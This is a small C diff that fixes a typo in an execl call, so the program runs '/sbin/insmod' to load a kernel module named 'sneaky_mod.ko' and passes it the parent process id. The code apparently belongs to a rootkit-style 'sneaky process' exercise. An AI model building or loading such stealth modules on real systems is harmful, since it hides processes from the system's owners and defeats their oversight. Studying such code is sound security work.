@@ -115,7 +115,7 @@ void loadModule() {
     long ppid = getppid(); // need parent pid
     sprintf(args, "pid=%ld", ppid);
 
-    if (execl("/sbin/insmon", "insmod", "sneaky_mod.ko", args, (char *)NULL) <
+    if (execl("/sbin/insmod", "insmod", "sneaky_mod.ko", args, (char *)NULL) <
         0) {
       printf("Error in loading module...\n");
       exit(EXIT_FAILURE);
